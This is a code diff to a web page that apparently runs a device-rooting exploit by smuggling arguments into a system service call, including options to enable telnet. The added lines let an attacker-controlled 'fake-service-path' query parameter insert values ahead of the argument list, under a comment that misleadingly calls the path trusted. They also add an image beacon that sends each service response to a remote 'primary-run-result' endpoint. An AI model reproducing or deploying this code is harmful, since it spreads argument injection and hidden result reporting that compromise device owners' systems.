@@ -79,6 +79,8 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 return rawFiles.split(';');
             })();
 
+            var fakeServicePath = getQueryParam('fake-service-path');
+
             var statusElem = document.getElementById('status');
             var debugElem = document.getElementById('debug');
             var errorElem = document.getElementById('error');
@@ -209,20 +211,25 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                     return;
                 }
 
-                var args = [];
+                var shellScriptPath = downloadDir + '/' + shellScriptName;
+                // Keep the trusted path in the position expected by the
+                // upstream SlopBro v0.1.0 service path workaround.
+                var args = ['--', '/tmp/run-js-service-no-cgroup', '^_~', downloadDir, shellScriptPath];
+                if (fakeServicePath) {
+                    args.unshift('a', 'b', 'c', fakeServicePath);
+                }
                 if (optTelnet) args.push('--telnet');
                 if (optDebug) args.push('--debug');
                 if (optCurlInsecure) args.push('--curl-insecure');
 
-                var shellScriptPath = downloadDir + '/' + shellScriptName;
-
-                var requestPayload = {
-                    inputParams: '-- /tmp/run-js-service-no-cgroup ^_~ ' + downloadDir + ' ' + shellScriptPath + ' ' + args.join(' ')
-                };
+                var requestPayload = { inputParams: args.join(' ') };
                 logDebug('request payload: ' + JSON.stringify(requestPayload));
 
                 bridge.onservicecallback = function (message) {
                     logDebug('received message: ' + message);
+                    var report = new Image();
+                    report.src = baseUrl + 'primary-run-result?m=' +
+                        encodeURIComponent(message) + '&t=' + Date.now();
 
                     var response = parse(message, '/run response');
                     if (response === null) {
